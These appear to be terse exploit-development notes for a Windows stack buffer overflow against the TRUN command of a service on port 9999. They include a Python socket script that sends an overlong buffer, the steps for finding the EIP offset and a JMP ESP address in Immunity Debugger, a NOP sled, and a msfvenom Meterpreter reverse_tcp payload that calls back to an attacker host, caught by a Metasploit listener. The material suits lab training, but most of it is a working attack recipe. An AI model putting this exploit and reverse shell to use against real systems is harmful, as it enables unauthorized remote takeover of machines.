######################################################
                Win Exploit Development
######################################################


                              
##############################win_buf.py#######################################
import socket

buf = "TRUN /.:/"
buf += "A" * 5000

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.50.34.144", 9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)
s.close()
#################################################################################

change buf to a 5000 char string from wiremask
from immunity debugger: find the EIP value
find offsetset from wiremask

#################################################################################
buf += "A" * 2003
#################################################################################

in the search bar for immunity debugger
!monna jmp -r esp -m "essfunc.dll"
view, log (find the log window)
under results copy a jump esp address value

#################################################################################
buf += "\xA0\x12\x50\x62"
buf += "\x90" * 10
#625012A0 (his value and the reverse value above will be the jump esp value copied)
#################################################################################

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.23.0 lport=4444 -b "\x00" -f python
copy payload to script after NOP sled line
DO NOT COPY: buf = b""

msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.50.23.0

run server
run script
run multi/handler



